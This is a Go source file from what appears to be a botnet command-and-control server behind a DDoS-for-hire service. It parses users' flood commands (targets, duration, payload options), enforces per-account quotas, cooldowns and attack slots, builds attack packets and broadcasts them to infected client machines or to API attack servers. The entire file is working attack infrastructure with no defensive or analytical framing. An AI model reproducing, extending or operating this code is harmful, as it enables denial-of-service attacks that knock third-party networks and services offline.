package floods

import (
	"cnc/internal"
	"cnc/internal/clients"
	"cnc/internal/database"
	"cnc/internal/master/floods/flags"
	"cnc/internal/master/sessions"
	"cnc/pkg/logging"
	"cnc/pkg/pattern"
	"errors"
	"fmt"
	"github.com/briandowns/spinner"
	"math/rand"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/dustin/go-humanize"
	"golang.org/x/exp/slices"
)

func (v *Vector) Handle(s *sessions.Session, name string, args ...string) (err error) {
	var profile = &AttackProfile{
		ID:       v.ID,
		AtkId:    uint16(rand.Intn(1 << 16)),
		Duration: 0,
		Targets:  make(map[uint32]uint8),
		Options:  make(map[*flags.Flag]string),
	}

	// Checks if the user has the needed roles for the method.
	if !s.ContainsRole(v.Roles) && !s.HasRole("admin") {
		return s.Notification("You dont have access to %s.", strconv.Quote(name))
	}

	// Argument check to prevent illegal attacks.
	if len(args) < 2 {
		return s.Notification("%s <targets> <duration> [..options]", name)
	}

	// Parse targets and limit them to 255.
	hosts := strings.Split(args[0], ",")
	if len(hosts) > 255 {
		return s.Notification("You can not specify more than 255 targets in one attack.")
	}

	// Iterate through hosts and validate them.
	if !v.IsL7 {
		for _, str := range hosts {
			target, err := NewTarget(str, s.UserProfile)
			if err != nil {
				if errors.Is(err, ErrBlacklistedTarget) {
					return s.Notification("Please specify a non blacklisted target. (%s)", str)
				}

				return s.Notification("Please specify a valid target ip address. (%s)", str)
			}

			profile.Targets[target.Address] = target.Netmask
		}
	} else {
		profile.L7Target = hosts[0]
		if len(hosts) > 1 {
			return s.Notification("HTTP floods do not support multiple targets.")
		}
	}

	// Converts duration (str) into an integer.
	duration, err := strconv.Atoi(args[1])
	if err != nil {
		return s.Notification("Please specify a valid attack duration.")
	}

	// Checks if the attack duration is over the users limit.
	if (v.API && duration > s.ApiDuration) || (!v.API && duration > s.Duration) {
		if v.API {
			return s.Notification("%ds is your maximum attack duration.", s.ApiDuration)
		}

		return s.Notification("%ds is your maximum attack duration.", s.Duration)
	}

	// Set duration in profile and remove the last 2 args from the list.
	profile.Duration = uint32(duration)
	args = args[2:]

	// Parses options.
	for len(args) > 0 {
		if args[0] == "?" || args[0] == "help" {
			return v.displayHelpMenu(strings.ToLower(name), s)
		}

		// Split flag by "="
		flagSplit := strings.Split(args[0], "=")

		// Check format (key=value)
		if len(flagSplit) < 2 || len(flagSplit[1]) < 1 {
			return s.Printfln("Please pass an flag if you meant to do so.")
		}

		// Accept quotes
		if flagSplit[1][0] == '"' {
			if strings.Count(flagSplit[1], "\"") != 2 {
				return s.Printfln("Invalid flag '%s' is parsed.", flagSplit[1])
			}

			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
		}

		// turn key into lowercase and stuff yeah
		key := strings.ToLower(flagSplit[0])
		value := flagSplit[1]

		// get the flag from the map
		//  and check if the flag exists or if the flood contains the flag
		info, ok := FlagList[key]
		if !ok || !slices.Contains(v.Flags, info.ID) {
			return s.Printfln("%s is an invalid flag for %s.", strconv.Quote(key), strconv.Quote(name))
		}

		if info.Options.Admin && !s.HasRole("admin") {
			return s.Printfln("You are not allowed to use an admin only flag.")
		}

		// validate flag type stuff yeah
		if err := info.Type.Validate(value, info); err != nil {
			return s.Printfln(err.Error())
		}

		// handle "profile" flags
		if info.Name == "profile" {
			info, ok = FlagList["payload"]
			if !ok || !slices.Contains(v.Flags, info.ID) {
				return s.Printfln("%s is an invalid flag for %s.", strconv.Quote(key), strconv.Quote(name))
			}

			value, ok = Presets[strings.ToLower(value)]
			if !ok {
				return s.Printfln("%s is an invalid payload profile.", strconv.Quote(value))
			}
		}

		profile.Options[info] = value
		args = args[1:]
	}

	if allowed, err := v.checkProfile(s); err != nil || !allowed {
		return err
	}

	floodPacket, err := profile.Build()
	if err != nil {
		logging.Global.Error().Err(err).Msg("An error occurred while building attack packet.")
		_ = s.Notification("An unexpected error occurred while trying to build the attack packet. Please contact staff.")
		return s.Notification("Error: %s", err.Error())
	}

	var started = time.Now()

	if err := database.Logs.Insert(&database.FloodLog{
		AttackID: int(profile.AtkId),
		UserID:   s.UserProfile.ID,
		MethodID: int(profile.ID),
		Targets:  hosts,
		Duration: int(profile.Duration),
		Clients:  0,
		Started:  started,
		Ended:    started.Add(time.Duration(profile.Duration) * time.Second),
		IsAPI:    v.API,
	}); err != nil {
		fmt.Println(err)
		return err
	}

	if !v.API {
		success := clients.Instruct(clients.OpFlood, floodPacket, v.createLimitation(s, profile))

		// This is the most cancer code in this CNC probably
		log, err := database.Logs.LastByUserID(s.UserProfile.ID)
		if err != nil {
			logging.Global.Error().Err(err).Msg("An unexpected error occurred while trying to modify the attack.")
			return err
		}

		// Modify the flood.
		log.Clients = success
		if err := log.Modify(); err != nil {
			logging.Global.Error().Err(err).Msg("An unexpected error occurred while trying to modify the attack.")
		}

		return s.Printfln("Broadcasted command to %d clients. ('bcstats' for more information, id=%d)", success, profile.AtkId)
	}

	spin := spinner.New(spinner.CharSets[9], 100*time.Millisecond)
	spin.Writer = s.Channel
	spin.Prefix = "Broadcasting command... "
	spin.Start()

	if err = v.SendAPIAttack(profile, name); err != nil {
		fmt.Println(err)
		return err
	}

	spin.Stop()

	return s.Printfln("Broadcasted command to all servers. ('bcstats' for more information)")
}

func (v *Vector) createLimitation(s *sessions.Session, profile *AttackProfile) *clients.Limitation {
	var limit = &clients.Limitation{
		Count: s.UserProfile.Clients,
		Group: make([]string, 0),
		UUID:  make([]string, 0),
		Admin: s.UserProfile.Name == "admin", // lol we hardcode it to my user
	}

	groups, ok := profile.Option("group")
	if ok {
		foundPossibles := pattern.Filter(clients.Groups(), strings.Split(groups, ","))
		limit.Group = foundPossibles
	}

	country, ok := profile.Option("country")
	if ok {
		limit.Country = country
	}

	count, ok := profile.Option("count")
	if ok {
		if c, err := strconv.Atoi(count); err == nil {
			limit.Count = c
		}
	}

	return limit
}

// displayHelpMenu displays a help menu, wow!
func (v *Vector) displayHelpMenu(vector string, s *sessions.Session) error {
	_ = s.ExecuteBranding(map[string]any{
		"atk_desc": v.Description,
		"atk_name": vector,
	}, "flags/flag_top.tfx")

	var flagNames []string

	for flagName := range FlagList {
		if slices.Contains(v.Flags, FlagList[flagName].ID) {
			flagNames = append(flagNames, flagName)
		}
	}

	sort.Slice(flagNames, func(i, j int) bool {
		return FlagList[flagNames[i]].ID < FlagList[flagNames[j]].ID
	})

	for _, flagName := range flagNames {
		flagInfo := FlagList[flagName]

		if flagInfo.Options.Invisible {
			continue
		}

		if flagInfo.Options.Admin && !s.HasRole("admin") {
			continue
		}

		_ = s.ExecuteBranding(map[string]any{
			"name":        flagName,
			"type":        flagInfo.Type.Name(),
			"description": flagInfo.Description,
		}, "flags/flag_center.tfx")
	}

	return s.ExecuteBranding(map[string]any{
		"atk_desc": v.Description,
		"atk_name": vector,
	}, "flags/flag_bottom.tfx")
}

func (v *Vector) checkProfile(s *sessions.Session) (bool, error) {
	// If this error occurs, the user has most likely been deleted.
	if err := s.Update(); err != nil {
		return false, s.Notification("Your access has been terminated. Please contact staff.")
	}

	// This one is obvious. This returns if the user has expired.
	if s.IsExpired() {
		return false, s.Notification("Your account has expired %s. Please contact staff.", humanize.Time(s.Expiry))
	}

	// If there is no attacks left, we'll notify the user.
	if s.LeftAttacks() <= 0 {
		return false, s.Notification("You have no daily attacks left.")
	}

	// We don't want more than one running count.
	var slots = internal.GlobalSlots
	if v.API {
		slots = internal.ApiSlots
	}

	if database.Logs.RunningCount(v.API) >= slots {
		return false, s.Notification("All slots are currently in use, please wait.")
	}

	// Get the current cooldown status
	end, cooldown, err := s.CooldownStatus(v.API)
	if err != nil && !strings.Contains(err.Error(), "no last attack recorded") {
		return false, s.Notification("An unknown database error occurred. Please contact staff! %s", err.Error())
	}

	// If there is cooldown, we'll tell the user for how long.
	if cooldown {
		return false, s.Notification("You are on cooldown for %.0f seconds.", time.Until(end).Seconds())
	}

	// checks global cooldown
	flood, err := database.Logs.LastGlobalFlood(v.API)
	if err != nil {
		return false, s.Notification("An unknown database error occurred. Please contact staff! %s", err.Error())
	}

	// fuck this shit code bro
	if flood != nil && !v.API {
		if internal.GlobalSlots > 1 {
			if time.Now().Before(flood.Started.Add(internal.GlobalCooldown)) {
				return false, s.Notification("Global cooldown is active for another %.0f seconds.", time.Until(flood.Started.Add(internal.GlobalCooldown)).Seconds())
			}
		} else {
			if time.Now().Before(flood.Ended.Add(internal.GlobalCooldown)) {
				return false, s.Notification("Global cooldown is active for another %.0f seconds.", time.Until(flood.Ended.Add(internal.GlobalCooldown)).Seconds())
			}
		}
	}

	return true, nil
}
